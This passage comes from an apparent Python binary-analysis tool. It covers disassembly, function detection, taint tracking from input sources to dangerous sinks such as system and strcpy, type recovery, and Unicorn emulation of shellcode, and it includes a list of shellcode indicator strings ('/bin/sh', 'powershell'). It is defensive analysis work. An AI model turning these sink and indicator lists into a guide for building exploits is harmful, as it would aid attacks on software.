        uses_rdi = any('rdi' in str(i.reads_regs) for i in first_instrs)
        uses_rcx = any('rcx' in str(i.reads_regs) for i in first_instrs)
        
        if uses_rdi:
            calling_convention = "System V AMD64 ABI"
        elif uses_rcx:
            calling_convention = "Microsoft x64"
        elif uses_rbp:
            calling_convention = "cdecl/stdcall (x86)"
    
    return DisassemblyFunction(
        name=func_name,
        address=base_address + func_offset,
        size=func_size,
        instructions=instructions_list[:500],  # Limit for response size
        calls=list(set(calls)),
        suspicious_patterns=suspicious_patterns,
        cfg=cfg,
        calling_convention=calling_convention,
        cyclomatic_complexity=cfg.complexity if cfg else 1,
        is_leaf=is_leaf,
        is_recursive=is_recursive,
        stack_frame_size=stack_frame_size,
    )


def build_cross_references(functions: List[DisassemblyFunction], 
                           string_map: Dict[int, str]) -> List[CrossReference]:
    """Build cross-reference list from analyzed functions."""
    xrefs = []
    
    # Build function address map
    func_map = {f.address: f.name for f in functions}
    
    for func in functions:
        for instr in func.instructions:
            # Code references (calls and jumps)
            if instr.target_address:
                if instr.is_call:
                    xref_type = "call"
                elif instr.is_jump:
                    xref_type = "jump"
                else:
                    xref_type = "reference"
                
                to_func = func_map.get(instr.target_address, None)
                
                xrefs.append(CrossReference(
                    from_address=instr.address,
                    to_address=instr.target_address,
                    xref_type=xref_type,
                    from_function=func.name,
                    to_function=to_func,
                ))
            
            # String references
            if instr.string_ref:
                xrefs.append(CrossReference(
                    from_address=instr.address,
                    to_address=0,  # String address would need to be tracked
                    xref_type="string_ref",
                    from_function=func.name,
                    to_function=None,
                ))
    
    return xrefs


def detect_function_boundaries(data: bytes, base_address: int, text_offset: int, 
                               text_size: int, architecture: str) -> List[Tuple[int, int]]:
    """Detect function boundaries using pattern matching."""
    if not CAPSTONE_AVAILABLE:
        return []
    
    md = get_capstone_instance(architecture)
    if not md:
        return []
    
    functions = []
    
    # Common function prologue patterns
    x86_prologues = [
        b'\x55\x89\xe5',           # push ebp; mov ebp, esp (32-bit)
        b'\x55\x48\x89\xe5',       # push rbp; mov rbp, rsp (64-bit)
        b'\x48\x83\xec',           # sub rsp, X (64-bit)
        b'\x48\x81\xec',           # sub rsp, X (64-bit, large frame)
        b'\x83\xec',               # sub esp, X (32-bit)
        b'\x81\xec',               # sub esp, X (32-bit, large frame)
    ]
    
    arm_prologues = [
        b'\x00\x48\x2d\xe9',       # push {fp, lr} (ARM)
        b'\xf0\x4f\x2d\xe9',       # push {r4-r11, lr}
    ]
    
    prologues = x86_prologues if 'x86' in architecture.lower() or 'amd64' in architecture.lower() else arm_prologues
    
    # Scan for function prologues
    code = data[text_offset:text_offset + text_size]
    
    for prologue in prologues:
        offset = 0
        while True:
            idx = code.find(prologue, offset)
            if idx == -1:
                break
            
            func_addr = base_address + text_offset + idx
            functions.append((func_addr, 0))  # Size unknown
            offset = idx + 1
    
    # Sort and deduplicate
    functions = sorted(set(functions))
    
    # Estimate sizes
    sized_functions = []
    for i, (addr, _) in enumerate(functions):
        if i + 1 < len(functions):
            size = functions[i + 1][0] - addr
        else:
            size = min(4096, text_size - (addr - base_address - text_offset))
        sized_functions.append((addr, max(16, min(size, 16384))))
    
    return sized_functions[:100]  # Limit to 100 detected functions


def disassemble_binary(file_path: Path, metadata: BinaryMetadata, 
                       symbols: List[ELFSymbol]) -> Optional[DisassemblyResult]:
    """Perform enhanced disassembly analysis of a binary with CFG and cross-references."""
    if not CAPSTONE_AVAILABLE:
        return None
    
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        architecture = metadata.architecture
        if architecture not in ('x86', 'x86_64', 'ARM', 'ARM64', 'i386', 'AMD64', 'AArch64'):
            # Try to normalize architecture
            arch_lower = architecture.lower() if architecture else ''
            if 'x86' in arch_lower and '64' in arch_lower:
                architecture = 'x86_64'
            elif 'x86' in arch_lower or 'i386' in arch_lower:
                architecture = 'x86'
            elif 'arm64' in arch_lower or 'aarch64' in arch_lower:
                architecture = 'ARM64'
            elif 'arm' in arch_lower:
                architecture = 'ARM'
            else:
                logger.info(f"Disassembly not supported for architecture: {architecture}")
                return None
        
        # Build string map for reference resolution
        strings = extract_strings(data, min_length=4, max_strings=10000)
        string_map = {s.offset: s.value for s in strings}
        
        # Build import map for reference resolution
        import_map = {}
        
        # Find .text section
        text_section = None
        for section in metadata.sections:
            if section.get("name") == ".text":
                text_section = section
                break
        
        if not text_section:
            # Try to disassemble from entry point
            entry_point = metadata.entry_point or 0
            entry_disasm = disassemble_at_address(data, 0, entry_point, architecture, 100, string_map)
            return DisassemblyResult(
                entry_point_disasm=entry_disasm,
                functions=[],
                suspicious_instructions=[{"note": "Could not find .text section"}],
                architecture=architecture,
                mode="64-bit" if "64" in architecture else "32-bit",
                total_instructions=len(entry_disasm),
            )
        
        text_addr = text_section.get("address", 0)
        text_size = text_section.get("size", 0)
        
        # Calculate file offset for .text section
        text_offset = 0
        if PYELFTOOLS_AVAILABLE:
            try:
                with open(file_path, 'rb') as f:
                    elf = ELFFile(f)
                    for section in elf.iter_sections():
                        if section.name == '.text':
                            text_offset = section['sh_offset']
                            break
            except Exception:
                pass
        
        # Disassemble entry point with CFG
        entry_point = metadata.entry_point or text_addr
        entry_offset = entry_point - text_addr + text_offset if entry_point >= text_addr else text_offset
        
        # Use recursive descent for entry point
        entry_instrs_map = recursive_disassemble(
            data, text_addr, entry_offset, architecture, 
            max_instructions=200, string_map=string_map
        )
        entry_disasm = sorted(entry_instrs_map.values(), key=lambda x: x.address)
        
        # Disassemble interesting functions
        functions = []
        suspicious_instructions = []
        total_instructions = len(entry_disasm)
        all_xrefs = []
        
        # Find functions with symbols
        func_symbols = [s for s in symbols if s.symbol_type == 'STT_FUNC' and s.size > 0]
        
        # If no symbols, try to detect function boundaries
        if not func_symbols:
            detected = detect_function_boundaries(data, text_addr, text_offset, text_size, architecture)
            for i, (addr, size) in enumerate(detected[:30]):
                func_symbols.append(ELFSymbol(
                    name=f"sub_{addr:x}",
                    address=addr,
                    size=size,
                    symbol_type='STT_FUNC',
                    binding='STB_LOCAL',
                    visibility='STV_DEFAULT',
                    section='.text',
                    is_suspicious=False,
                ))
        
        # Prioritize suspicious functions and main/init functions
        priority_funcs = []
        other_funcs = []
        
        priority_names = {'main', '_start', '__libc_start_main', 'init', '_init', '__init', 
                          'entry', 'start', 'WinMain', 'wWinMain', 'DllMain', '_DllMain'}
        
        for sym in func_symbols:
            if sym.is_suspicious or sym.name in priority_names or 'main' in sym.name.lower():
                priority_funcs.append(sym)
            else:
                other_funcs.append(sym)
        
        # Also look for anti-analysis functions
        for sym in func_symbols:
            if sym.name in ANTI_ANALYSIS_FUNCTIONS:
                if sym not in priority_funcs:
                    priority_funcs.insert(0, sym)
        
        # Disassemble up to 15 priority functions and 10 other functions
        funcs_to_analyze = priority_funcs[:15] + other_funcs[:10]
        
        for sym in funcs_to_analyze:
            try:
                func_offset = sym.address - text_addr + text_offset
                if 0 <= func_offset < len(data):
                    func_disasm = disassemble_function(
                        data, text_addr, func_offset, sym.size,
                        sym.name, architecture, symbols, string_map
                    )
                    functions.append(func_disasm)
                    total_instructions += len(func_disasm.instructions)
                    
                    # Collect suspicious patterns
                    for pattern in func_disasm.suspicious_patterns:
                        suspicious_instructions.append({
                            "function": sym.name,
                            "pattern": pattern,
                            "address": f"0x{func_disasm.address:x}",
                        })
                    
                    # Check for anti-analysis function calls
                    for call in func_disasm.calls:
                        if call in ANTI_ANALYSIS_FUNCTIONS:
                            suspicious_instructions.append({
                                "function": sym.name,
                                "pattern": f"Calls {call}: {ANTI_ANALYSIS_FUNCTIONS[call]}",
                                "severity": "medium",
                            })
                            
            except Exception as e:
                logger.warning(f"Failed to disassemble function {sym.name}: {e}")
        
        # Build cross-references
        all_xrefs = build_cross_references(functions, string_map)
        
        # Calculate coverage
        coverage = (total_instructions * 4) / max(text_size, 1) * 100  # Rough estimate
        coverage = min(100.0, coverage)
        
        # Build string reference map for result
        string_refs = {}
        for func in functions:
            for instr in func.instructions:
                if instr.string_ref:
                    string_refs[instr.address] = instr.string_ref
        
        return DisassemblyResult(
            entry_point_disasm=entry_disasm[:100],
            functions=functions,
            suspicious_instructions=suspicious_instructions,
            architecture=architecture,
            mode="64-bit" if "64" in architecture else "32-bit",
            cross_references=all_xrefs[:500],  # Limit xrefs
            string_references=string_refs,
            import_references=import_map,
            total_instructions=total_instructions,
            coverage_percent=round(coverage, 2),
        )
        
    except Exception as e:
        logger.error(f"Binary disassembly failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return None


# ============================================================================
# Data Flow Analysis (Taint Tracking)
# ============================================================================

# Common taint sources (where untrusted data enters)
TAINT_SOURCES = {
    # Linux syscalls
    "read": ("user_input", "Reads from file descriptor"),
    "recv": ("network", "Receives network data"),
    "recvfrom": ("network", "Receives UDP data"),
    "recvmsg": ("network", "Receives message"),
    "accept": ("network", "Accepts connection"),
    "getenv": ("environment", "Gets environment variable"),
    "fgets": ("user_input", "Reads string from stream"),
    "gets": ("user_input", "DANGEROUS: Reads unbounded string"),
    "scanf": ("user_input", "Formatted input"),
    "fscanf": ("user_input", "Formatted file input"),
    # Windows APIs
    "ReadFile": ("user_input", "Reads from file"),
    "ReadConsole": ("user_input", "Reads console input"),
    "recv": ("network", "Receives network data"),
    "WSARecv": ("network", "Windows socket receive"),
    "InternetReadFile": ("network", "HTTP data read"),
    "GetEnvironmentVariable": ("environment", "Gets env var"),
    "RegQueryValueEx": ("environment", "Registry read"),
    "GetCommandLine": ("argv", "Command line arguments"),
}

# Dangerous sinks where tainted data causes vulnerabilities
TAINT_SINKS = {
    # Command injection
    "system": ("exec", "CWE-78", "Command injection"),
    "popen": ("exec", "CWE-78", "Command injection via popen"),
    "execve": ("exec", "CWE-78", "Direct execution"),
    "execl": ("exec", "CWE-78", "Direct execution"),
    "execv": ("exec", "CWE-78", "Direct execution"),
    "ShellExecute": ("exec", "CWE-78", "Windows shell execute"),
    "CreateProcess": ("exec", "CWE-78", "Windows process creation"),
    "WinExec": ("exec", "CWE-78", "Windows execution"),
    # Format string
    "printf": ("format_string", "CWE-134", "Format string if arg is tainted"),
    "sprintf": ("format_string", "CWE-134", "Format string"),
    "fprintf": ("format_string", "CWE-134", "Format string"),
    "syslog": ("format_string", "CWE-134", "Format string in logging"),
    # Buffer overflow
    "strcpy": ("memcpy", "CWE-120", "Unbounded string copy"),
    "strcat": ("memcpy", "CWE-120", "Unbounded string concat"),
    "gets": ("memcpy", "CWE-120", "CRITICAL: No bounds check"),
    "sprintf": ("memcpy", "CWE-120", "No bounds on output"),
    "memcpy": ("memcpy", "CWE-120", "Memory copy with tainted size"),
    "memmove": ("memcpy", "CWE-120", "Memory move"),
    # SQL injection
    "sqlite3_exec": ("sql", "CWE-89", "SQLite execution"),
    "mysql_query": ("sql", "CWE-89", "MySQL query"),
    "PQexec": ("sql", "CWE-89", "PostgreSQL execution"),
    # File operations
    "fopen": ("file_write", "CWE-22", "Path traversal if tainted path"),
    "open": ("file_write", "CWE-22", "Path traversal"),
    "CreateFile": ("file_write", "CWE-22", "Windows file open"),
    "unlink": ("file_write", "CWE-22", "File deletion"),
    "remove": ("file_write", "CWE-22", "File removal"),
}


def analyze_data_flow(instructions_map: Dict[int, DisassemblyInstruction],
                      cfg: Optional[ControlFlowGraph],
                      imports: List[ImportedFunction],
                      architecture: str) -> DataFlowAnalysisResult:
    """
    Perform taint analysis / data flow analysis on disassembled code.
    
    This is a simplified intraprocedural analysis that tracks:
    1. Where untrusted data enters (sources)
    2. Where it flows through registers/memory
    3. Whether it reaches dangerous operations (sinks)
    """
    taint_sources = []
    taint_sinks = []
    data_flow_paths = []
    
    if not instructions_map:
        return DataFlowAnalysisResult(
            taint_sources=[], taint_sinks=[], data_flow_paths=[],
            vulnerable_paths=[], total_paths_analyzed=0
        )
    
    # Build import address map
    import_map = {imp.name.lower(): imp for imp in imports}
    
    # First pass: identify sources and sinks
    for addr, instr in sorted(instructions_map.items()):
        if instr.is_call:
            # Check if calling a taint source
            target_name = instr.op_str.lower().strip()
            for func_name, (source_type, desc) in TAINT_SOURCES.items():
                if func_name.lower() in target_name:
                    # Return value (rax/eax) is tainted
                    ret_reg = "rax" if "64" in architecture else "eax"
                    taint_sources.append(TaintSource(
                        address=addr,
                        source_type=source_type,
                        register_or_memory=ret_reg,
                        function_name=func_name,
                        description=desc
                    ))
                    break
            
            # Check if calling a taint sink
            for func_name, (sink_type, cwe, desc) in TAINT_SINKS.items():
                if func_name.lower() in target_name:
                    taint_sinks.append(TaintSink(
                        address=addr,
                        sink_type=sink_type,
                        function_name=func_name,
                        cwe_id=cwe,
                        description=desc
                    ))
                    break
    
    # Second pass: simple taint propagation
    # Track which registers are tainted
    tainted_regs: Dict[int, Set[str]] = {}  # address -> set of tainted registers
    
    current_taint: Set[str] = set()
    
    for addr, instr in sorted(instructions_map.items()):
        # Check if this is a source - taints return register
        for source in taint_sources:
            if source.address == addr:
                current_taint.add(source.register_or_memory)
        
        # Propagate taint through mov instructions
        mnemonic = instr.mnemonic.lower()
        if mnemonic in ('mov', 'movzx', 'movsx', 'lea'):
            # Parse operands
            parts = instr.op_str.split(',')
            if len(parts) == 2:
                dest = parts[0].strip().lower()
                src = parts[1].strip().lower()
                
                # If source is tainted, destination becomes tainted
                if any(t in src for t in current_taint):
                    current_taint.add(dest)
                # If destination is written with clean value, remove taint
                elif dest in current_taint and not any(t in src for t in current_taint):
                    # Only remove if source is clearly a constant
                    if src.startswith('0x') or src.isdigit():
                        current_taint.discard(dest)
        
        # Check for xor reg, reg (clears register)
        if mnemonic == 'xor':
            parts = instr.op_str.split(',')
            if len(parts) == 2 and parts[0].strip() == parts[1].strip():
                current_taint.discard(parts[0].strip().lower())
        
        tainted_regs[addr] = current_taint.copy()
        
        # Check if tainted data reaches a sink
        for sink in taint_sinks:
            if sink.address == addr:
                # Check calling convention - first arg in rdi/rcx, second in rsi/rdx
                arg_regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'] if '64' in architecture else ['eax', 'ecx', 'edx']
                
                if any(reg in current_taint for reg in arg_regs):
                    # Find which source this came from
                    for source in taint_sources:
                        if source.address < sink.address:
                            # Build path
                            path_addrs = [a for a in sorted(instructions_map.keys()) 
                                         if source.address <= a <= sink.address]
                            path_instrs = [f"{instructions_map[a].mnemonic} {instructions_map[a].op_str}" 
                                          for a in path_addrs[:20]]
                            
                            data_flow_paths.append(DataFlowPath(
                                source=source,
                                sink=sink,
                                path=path_addrs,
                                instructions=path_instrs,
                                is_exploitable=True,
                                confidence=0.7,
                                vulnerability_type=sink.sink_type,
                                cwe_id=sink.cwe_id
                            ))
    
    vulnerable_paths = [p for p in data_flow_paths if p.is_exploitable]
    
    return DataFlowAnalysisResult(
        taint_sources=taint_sources,
        taint_sinks=taint_sinks,
        data_flow_paths=data_flow_paths,
        vulnerable_paths=vulnerable_paths,
        total_paths_analyzed=len(data_flow_paths),
        analysis_coverage=min(100.0, len(instructions_map) / 10)  # Rough estimate
    )


# ============================================================================
# Type Recovery
# ============================================================================

# Common type signatures based on instruction patterns
TYPE_PATTERNS = {
    # Integer operations
    "add|sub|imul|idiv|inc|dec": "int",
    # Floating point
    "movss|movsd|addss|subss|mulss|divss|cvt": "float",
    # String operations
    "rep movs|rep stos|scas|cmps": "char*",
    # Memory allocation patterns
    "call.*malloc|call.*calloc|call.*realloc": "void*",
}


def recover_types(instructions_map: Dict[int, DisassemblyInstruction],
                  cfg: Optional[ControlFlowGraph],
                  architecture: str) -> TypeRecoveryResult:
    """
    Recover type information from disassembled code.
    
    Uses heuristics based on:
    1. Instruction patterns (float ops = float type)
    2. Stack frame layout
    3. Calling convention
    4. Memory access patterns
    """
    functions = []
    structs = []
    global_vars = []
    
    if not instructions_map:
        return TypeRecoveryResult(functions=[], structs=[], global_vars=[], vtables=[])
    
    # Analyze stack frame
    stack_accesses: Dict[int, List[Tuple[int, str, int]]] = {}  # offset -> [(addr, access_type, size)]
    current_function_start = min(instructions_map.keys())
    
    is_64bit = "64" in architecture
    ptr_size = 8 if is_64bit else 4
    
    for addr, instr in sorted(instructions_map.items()):
        # Look for stack accesses [rbp-X] or [rsp+X]
        bp_match = re.search(r'\[(r?[be]bp)\s*([+-])\s*(0x[0-9a-fA-F]+|\d+)\]', instr.op_str)
        sp_match = re.search(r'\[(r?[es]sp)\s*\+\s*(0x[0-9a-fA-F]+|\d+)\]', instr.op_str)
        
        offset = None
        if bp_match:
            sign = 1 if bp_match.group(2) == '+' else -1
            offset = sign * int(bp_match.group(3), 0)
        elif sp_match:
            offset = int(sp_match.group(2), 0)
        
        if offset is not None:
            access_type = "write" if instr.op_str.startswith('[') or ',' in instr.op_str and '[' in instr.op_str.split(',')[0] else "read"
            
            # Infer size from instruction
            if 'qword' in instr.op_str or instr.mnemonic in ('movq', 'pushq', 'popq'):
                size = 8
            elif 'dword' in instr.op_str or instr.mnemonic.endswith('d'):
                size = 4
            elif 'word' in instr.op_str or instr.mnemonic.endswith('w'):
                size = 2
            elif 'byte' in instr.op_str or instr.mnemonic.endswith('b'):
                size = 1
            else:
                size = ptr_size
            
            if offset not in stack_accesses:
                stack_accesses[offset] = []
            stack_accesses[offset].append((addr, access_type, size))
    
    # Build local variables from stack accesses
    local_vars = []
    for offset, accesses in sorted(stack_accesses.items()):
        if offset < 0:  # Local variables are at negative offsets from RBP
            sizes = [a[2] for a in accesses]
            most_common_size = max(set(sizes), key=sizes.count)
            
            # Infer type from size
            if most_common_size == 1:
                inferred_type = "char"
            elif most_common_size == 2:
                inferred_type = "short"
            elif most_common_size == 4:
                inferred_type = "int"
            elif most_common_size == 8:
                inferred_type = "long/ptr"
            else:
                inferred_type = f"byte[{most_common_size}]"
            
            local_vars.append(RecoveredLocalVar(
                stack_offset=offset,
                size=most_common_size,
                inferred_type=inferred_type,
                scope_start=min(a[0] for a in accesses),
                scope_end=max(a[0] for a in accesses)
            ))
    
    # Detect function arguments based on calling convention
    args = []
    if is_64bit:
        # System V AMD64: rdi, rsi, rdx, rcx, r8, r9
        # Windows x64: rcx, rdx, r8, r9
        arg_regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
        for idx, reg in enumerate(arg_regs):
            # Check if register is used early in function
            for addr, instr in list(sorted(instructions_map.items()))[:20]:
                if reg in instr.op_str.lower() and reg not in instr.mnemonic.lower():
                    args.append(RecoveredArgument(
                        index=idx,
                        register_or_stack=reg,
                        inferred_type="unknown",
                        is_pointer=False
                    ))
                    break
    else:
        # x86 cdecl: arguments on stack
        for offset, accesses in stack_accesses.items():
            if offset > 0:  # Arguments at positive offsets from EBP
                sizes = [a[2] for a in accesses]
                most_common_size = max(set(sizes), key=sizes.count) if sizes else 4
                args.append(RecoveredArgument(
                    index=len(args),
                    register_or_stack=f"[ebp+{offset}]",
                    inferred_type="int" if most_common_size == 4 else f"byte[{most_common_size}]",
                    is_pointer=False
                ))
    
    # Create recovered function signature
    if instructions_map:
        func_start = min(instructions_map.keys())
        func_end = max(instructions_map.keys())
        
        functions.append(RecoveredFunctionSignature(
            address=func_start,
            name=f"sub_{func_start:x}",
            return_type="int",  # Default assumption
            arguments=args[:6],  # Limit to reasonable number
            local_vars=local_vars,
            calling_convention="System V AMD64" if is_64bit else "cdecl",
            confidence=0.5
        ))
    
    # Detect potential struct patterns (repeated access at fixed offsets)
    struct_patterns: Dict[int, List[int]] = {}  # base_reg_addr -> [offsets]
    
    for addr, instr in instructions_map.items():
        # Look for [reg+offset] patterns that suggest struct access
        struct_match = re.search(r'\[(r[a-z0-9]+)\s*\+\s*(0x[0-9a-fA-F]+|\d+)\]', instr.op_str)
        if struct_match:
            offset = int(struct_match.group(2), 0)
            if addr not in struct_patterns:
                struct_patterns[addr] = []
            struct_patterns[addr].append(offset)
    
    # Group offsets to find struct layouts
    offset_groups: Dict[frozenset, int] = {}
    for addr, offsets in struct_patterns.items():
        key = frozenset(offsets)
        if len(key) >= 2:  # At least 2 field accesses
            offset_groups[key] = offset_groups.get(key, 0) + 1
    
    # Create struct definitions for common patterns
    for offsets, count in sorted(offset_groups.items(), key=lambda x: -x[1])[:5]:
        if count >= 2:  # Pattern appears multiple times
            fields = []
            sorted_offsets = sorted(offsets)
            for i, off in enumerate(sorted_offsets):
                next_off = sorted_offsets[i + 1] if i + 1 < len(sorted_offsets) else off + ptr_size
                size = next_off - off
                fields.append(RecoveredField(
                    offset=off,
                    size=min(size, 64),
                    inferred_type="int" if size == 4 else "long/ptr" if size == 8 else f"byte[{size}]",
                    access_pattern="read_write"
                ))
            
            structs.append(RecoveredStruct(
                address=0,
                total_size=max(offsets) + ptr_size if offsets else 0,
                fields=fields,
                inferred_name=f"struct_{len(structs)}",
                confidence=min(1.0, count / 10),
                usage_count=count
            ))
    
    return TypeRecoveryResult(
        functions=functions,
        structs=structs,
        global_vars=global_vars,
        vtables=[],
        total_types_recovered=len(functions) + len(structs)
    )


# ============================================================================
# Unicorn-based CPU Emulation
# ============================================================================

class BinaryEmulator:
    """
    Unicorn-based CPU emulator for analyzing code behavior.
    
    Use cases:
    - Shellcode analysis
    - String deobfuscation (run decryption loops)
    - Understanding self-modifying code
    - Tracing execution paths
    """
    
    def __init__(self, architecture: str, data: bytes, base_address: int = 0x400000):
        self.architecture = architecture
        self.data = data
        self.base_address = base_address
        self.uc = None
        self.trace: List[EmulationState] = []
        self.memory_accesses: List[EmulationMemoryAccess] = []
        self.decoded_strings: List[DecodedString] = []
        self.instruction_count = 0
        self.max_instructions = 100000  # Prevent infinite loops
        
        # Memory regions
        self.code_base = base_address
        self.code_size = len(data)
        self.stack_base = 0x7fff0000
        self.stack_size = 0x10000
        self.heap_base = 0x10000000
        self.heap_size = 0x100000
        
        self._setup_emulator()
    
    def _setup_emulator(self):
        """Initialize Unicorn emulator with appropriate architecture."""
        if not UNICORN_AVAILABLE:
            logger.warning("Unicorn not available - emulation disabled")
            return
        
        try:
            if 'x86_64' in self.architecture or 'AMD64' in self.architecture:
                self.uc = Uc(UC_ARCH_X86, UC_MODE_64)
                self.is_64bit = True
            elif 'x86' in self.architecture or 'i386' in self.architecture:
                self.uc = Uc(UC_ARCH_X86, UC_MODE_32)
                self.is_64bit = False
            elif 'ARM64' in self.architecture or 'AArch64' in self.architecture:
                self.uc = Uc(UC_ARCH_ARM64, UC_MODE_ARM)
                self.is_64bit = True
            elif 'ARM' in self.architecture:
                self.uc = Uc(UC_ARCH_ARM, UC_MODE_ARM)
                self.is_64bit = False
            else:
                logger.warning(f"Unsupported architecture for emulation: {self.architecture}")
                return
            
            # Map memory regions
            # Code section
            code_aligned_size = ((self.code_size + 0xfff) // 0x1000) * 0x1000
            self.uc.mem_map(self.code_base, max(code_aligned_size, 0x1000))
            self.uc.mem_write(self.code_base, self.data)
            
            # Stack
            self.uc.mem_map(self.stack_base - self.stack_size, self.stack_size)
            
            # Heap (for allocated memory during emulation)
            self.uc.mem_map(self.heap_base, self.heap_size)
            
            # Initialize stack pointer
            sp = self.stack_base - 0x1000
            if self.is_64bit:
                self.uc.reg_write(UC_X86_REG_RSP, sp)
                self.uc.reg_write(UC_X86_REG_RBP, sp)
            else:
                self.uc.reg_write(UC_X86_REG_ESP, sp)
                self.uc.reg_write(UC_X86_REG_EBP, sp)
            
            # Add hooks
            self._add_hooks()
            
        except Exception as e:
            logger.error(f"Failed to setup emulator: {e}")
            self.uc = None
    
    def _add_hooks(self):
        """Add emulation hooks for tracing."""
        if not self.uc:
            return
        
        # Hook all code execution
        def hook_code(uc, address, size, user_data):
            self.instruction_count += 1
            if self.instruction_count > self.max_instructions:
                uc.emu_stop()
                return
            
            # Capture state periodically
            if self.instruction_count % 100 == 0:
                state = self._capture_state(address)
                self.trace.append(state)
        
        self.uc.hook_add(1, hook_code)  # UC_HOOK_CODE = 1
        
        # Hook memory access
        def hook_mem_access(uc, access, address, size, value, user_data):
            access_type = "write" if access == 17 else "read"  # UC_MEM_WRITE = 17
            self.memory_accesses.append(EmulationMemoryAccess(
                address=address,
                access_type=access_type,
                size=size,
                value=value if access == 17 else None,
                instruction_address=0
            ))
        
        self.uc.hook_add(18, hook_mem_access)  # UC_HOOK_MEM_WRITE = 18
        self.uc.hook_add(16, hook_mem_access)  # UC_HOOK_MEM_READ = 16
    
    def _capture_state(self, address: int) -> EmulationState:
        """Capture current CPU state."""
        regs = {}
        if self.is_64bit:
            regs = {
                "rax": self.uc.reg_read(UC_X86_REG_RAX),
                "rbx": self.uc.reg_read(UC_X86_REG_RBX),
                "rcx": self.uc.reg_read(UC_X86_REG_RCX),
                "rdx": self.uc.reg_read(UC_X86_REG_RDX),
                "rsi": self.uc.reg_read(UC_X86_REG_RSI),
                "rdi": self.uc.reg_read(UC_X86_REG_RDI),
                "rsp": self.uc.reg_read(UC_X86_REG_RSP),
                "rbp": self.uc.reg_read(UC_X86_REG_RBP),
                "rip": self.uc.reg_read(UC_X86_REG_RIP),
                "r8": self.uc.reg_read(UC_X86_REG_R8),
                "r9": self.uc.reg_read(UC_X86_REG_R9),
            }
        else:
            regs = {
                "eax": self.uc.reg_read(UC_X86_REG_EAX),
                "ebx": self.uc.reg_read(UC_X86_REG_EBX),
                "ecx": self.uc.reg_read(UC_X86_REG_ECX),
                "edx": self.uc.reg_read(UC_X86_REG_EDX),
                "esi": self.uc.reg_read(UC_X86_REG_ESI),
                "edi": self.uc.reg_read(UC_X86_REG_EDI),
                "esp": self.uc.reg_read(UC_X86_REG_ESP),
                "ebp": self.uc.reg_read(UC_X86_REG_EBP),
                "eip": self.uc.reg_read(UC_X86_REG_EIP),
            }
        
        eflags = self.uc.reg_read(UC_X86_REG_EFLAGS)
        flags = {
            "CF": bool(eflags & 0x1),
            "ZF": bool(eflags & 0x40),
            "SF": bool(eflags & 0x80),
            "OF": bool(eflags & 0x800),
        }
        
        return EmulationState(
            address=address,
            registers=regs,
            flags=flags,
            stack_top=[],
            instruction_count=self.instruction_count
        )
    
    def emulate(self, start_address: int, end_address: int = 0, 
                timeout_ms: int = 5000) -> EmulationTrace:
        """
        Emulate code from start_address.
        
        Args:
            start_address: Address to start emulation
            end_address: Address to stop (0 = run until stop/error)
            timeout_ms: Maximum emulation time in milliseconds
        
        Returns:
            EmulationTrace with results
        """
        if not self.uc:
            return EmulationTrace(
                start_address=start_address,
                end_address=0,
                instructions_executed=0,
                states=[],
                memory_accesses=[],
                syscalls=[],
                api_calls=[],
                decoded_strings=[],
                loops_detected=[],
                suspicious_behaviors=[],
                error="Emulator not available"
            )
        
        self.instruction_count = 0
        self.trace = []
        self.memory_accesses = []
        
        # Capture initial state
        initial_state = self._capture_state(start_address)
        self.trace.append(initial_state)
        
        error = None
        end_addr = 0
        
        try:
            if end_address:
                self.uc.emu_start(start_address, end_address, timeout=timeout_ms * 1000)
            else:
                # Run until we hit unmapped memory, invalid instruction, or timeout
                self.uc.emu_start(start_address, self.code_base + self.code_size, 
                                  timeout=timeout_ms * 1000, count=self.max_instructions)
            
            end_addr = self.uc.reg_read(UC_X86_REG_RIP if self.is_64bit else UC_X86_REG_EIP)
            
        except Exception as e:
            error = str(e)
            end_addr = start_address
        
        # Capture final state
        if self.uc:
            final_state = self._capture_state(end_addr)
            self.trace.append(final_state)
        
        # Analyze for decoded strings in memory
        self._scan_for_strings()
        
        # Detect loops
        loops = self._detect_loops()
        
        # Check for suspicious behaviors
        suspicious = self._analyze_suspicious_behavior()
        
        return EmulationTrace(
            start_address=start_address,
            end_address=end_addr,
            instructions_executed=self.instruction_count,
            states=self.trace,
            memory_accesses=self.memory_accesses[:1000],  # Limit
            syscalls=[],
            api_calls=[],
            decoded_strings=self.decoded_strings,
            loops_detected=loops,
            suspicious_behaviors=suspicious,
            error=error
        )
    
    def _scan_for_strings(self):
        """Scan memory for strings that appeared during emulation."""
        if not self.uc:
            return
        
        try:
            # Read heap memory looking for strings
            heap_data = self.uc.mem_read(self.heap_base, min(self.heap_size, 0x10000))
            
            # Find ASCII strings
            ascii_pattern = re.compile(rb'[\x20-\x7e]{4,}')
            for match in ascii_pattern.finditer(heap_data):
                try:
                    decoded = match.group().decode('ascii')
                    self.decoded_strings.append(DecodedString(
                        address=self.heap_base + match.start(),
                        decoded_value=decoded,
                        encoding="ascii",
                        decoding_method="emulation",
                        original_bytes=match.group()
                    ))
                except:
                    pass
        except:
            pass
    
    def _detect_loops(self) -> List[Dict[str, Any]]:
        """Detect execution loops from trace."""
        loops = []
        address_counts: Dict[int, int] = {}
        
        for state in self.trace:
            addr = state.address
            address_counts[addr] = address_counts.get(addr, 0) + 1
        
        for addr, count in address_counts.items():
            if count >= 3:  # Address visited 3+ times = likely a loop
                loops.append({
                    "address": addr,
                    "iterations": count,
                    "type": "potential_loop"
                })
        
        return loops[:20]  # Limit to top 20
    
    def _analyze_suspicious_behavior(self) -> List[str]:
        """Analyze emulation results for suspicious patterns."""
        suspicious = []
        
        # Check for self-modifying code (writes to code section)
        for access in self.memory_accesses:
            if access.access_type == "write":
                if self.code_base <= access.address < self.code_base + self.code_size:
                    suspicious.append(f"Self-modifying code detected at 0x{access.address:x}")
        
        # Check for high instruction count (potential unpacking loop)
        if self.instruction_count > 50000:
            suspicious.append(f"High instruction count ({self.instruction_count}) - possible unpacking/decryption loop")
        
        # Check for decoded strings that look like shellcode artifacts
        shellcode_indicators = ['cmd', 'powershell', '/bin/sh', 'calc.exe', 'WinExec', 'CreateProcess']
        for ds in self.decoded_strings:
            for indicator in shellcode_indicators:
                if indicator.lower() in ds.decoded_value.lower():
                    suspicious.append(f"Suspicious string decoded: '{ds.decoded_value[:50]}'")
                    break
        
        return suspicious[:20]
    
    def emulate_function(self, func_address: int, 
                         args: List[int] = None) -> EmulationTrace:
        """
        Emulate a specific function with arguments.
        
        Args:
